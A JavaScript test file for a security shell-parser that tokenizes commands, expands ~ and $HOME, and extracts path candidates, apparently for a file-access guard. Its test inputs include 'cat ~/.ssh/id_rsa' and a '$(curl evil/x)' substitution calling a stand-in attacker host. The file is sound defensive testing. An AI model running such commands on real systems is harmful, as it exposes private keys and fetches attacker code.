import * as assert from 'node:assert/strict';
import * as os from 'node:os';
import { test, describe } from 'node:test';
import { extractCandidates } from '../../scripts/security/shell-parser.js';

const homeDir = os.homedir();
const mockPolicy = {
  homeDir,
  knownEnvVars: { HOME: homeDir, USER: 'testuser' },
};

describe('tokenizeCommand (via extractCandidates)', () => {
  test('splits simple command into tokens', () => {
    // We can use a path separator to force them to be candidates
    const candidates = extractCandidates('cat/x foo/y bar/z', mockPolicy);
    assert.deepEqual(
      candidates.map((c) => c.expanded),
      ['cat/x', 'foo/y', 'bar/z']
    );
  });

  test('handles double-quoted token with spaces', () => {
    const candidates = extractCandidates('cat "foo bar/x"', mockPolicy);
    assert.deepEqual(
      candidates.map((c) => c.expanded),
      ['foo bar/x']
    );
  });

  test('handles single-quoted token with spaces', () => {
    const candidates = extractCandidates("cat 'foo bar/x'", mockPolicy);
    assert.deepEqual(
      candidates.map((c) => c.expanded),
      ['foo bar/x']
    );
  });

  test('empty string returns empty array', () => {
    assert.deepEqual(extractCandidates('', mockPolicy), []);
  });
});

describe('expandToken (via extractCandidates)', () => {
  test('expands ~ to homeDir', () => {
    const candidates = extractCandidates('~', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, homeDir);
    assert.deepEqual([...candidates[0].unresolvedVars], []);
  });

  test('expands ~/x to homeDir/x', () => {
    const candidates = extractCandidates('~/x', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, homeDir + '/x');
  });

  test('expands $HOME/x', () => {
    const candidates = extractCandidates('$HOME/x', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, homeDir + '/x');
    assert.deepEqual([...candidates[0].unresolvedVars], []);
  });

  test('expands ${HOME}/x', () => {
    const candidates = extractCandidates('${HOME}/x', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, homeDir + '/x');
  });

  test('records unresolved $UNSET variable', () => {
    const candidates = extractCandidates('$UNSET/x', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, '$UNSET/x');
    assert.ok(
      candidates[0].unresolvedVars.includes('$UNSET'),
      `Expected $UNSET in unresolvedVars, got ${JSON.stringify(candidates[0].unresolvedVars)}`
    );
  });

  test('expands multiple vars in one token', () => {
    const candidates = extractCandidates('$HOME/$USER', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, homeDir + '/testuser');
    assert.deepEqual([...candidates[0].unresolvedVars], []);
  });

  test('tilde NOT at position 0 is unchanged', () => {
    const candidates = extractCandidates('foo~bar/x', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.equal(candidates[0].expanded, 'foo~bar/x');
  });

  test('does not expand ~root/file', () => {
    const candidates = extractCandidates('~root/file', mockPolicy);
    assert.equal(candidates.length, 1);
    // ~root does not start with ~/ so should remain unchanged
    assert.equal(candidates[0].expanded, '~root/file');
  });
});

describe('extractCandidates', () => {
  test('returns one candidate for ~/.ssh/id_rsa', () => {
    const candidates = extractCandidates('cat ~/.ssh/id_rsa', mockPolicy);
    assert.equal(candidates.length, 1);
    assert.ok(candidates[0].expanded.includes('.ssh/id_rsa'));
  });

  test('returns empty for ls -la (no path separator)', () => {
    const candidates = extractCandidates('ls -la', mockPolicy);
    assert.deepEqual(candidates, []);
  });

  test('returns empty for git status', () => {
    const candidates = extractCandidates('git status', mockPolicy);
    assert.deepEqual(candidates, []);
  });

  test('find / -name foo emits / candidate', () => {
    const candidates = extractCandidates('find / -name foo', mockPolicy);
    const expanded = candidates.map((c) => c.expanded);
    assert.ok(
      expanded.some((e) => e === '/'),
      `Expected / in candidates, got ${JSON.stringify(expanded)}`
    );
  });

  test('documented limitation: $(curl evil/x) — evil/x is a candidate', () => {
    // tokenizer produces '$(curl' and 'evil/x)' — second contains path sep
    const candidates = extractCandidates('$(curl evil/x)', mockPolicy);
    const raws = candidates.map((c) => c.raw);
    // 'evil/x)' has a path separator, so it's a candidate (documented behavior, not an error)
    assert.ok(
      raws.some((r) => r.includes('evil/x')),
      `Expected evil/x token as candidate: ${JSON.stringify(raws)}`
    );
  });
});
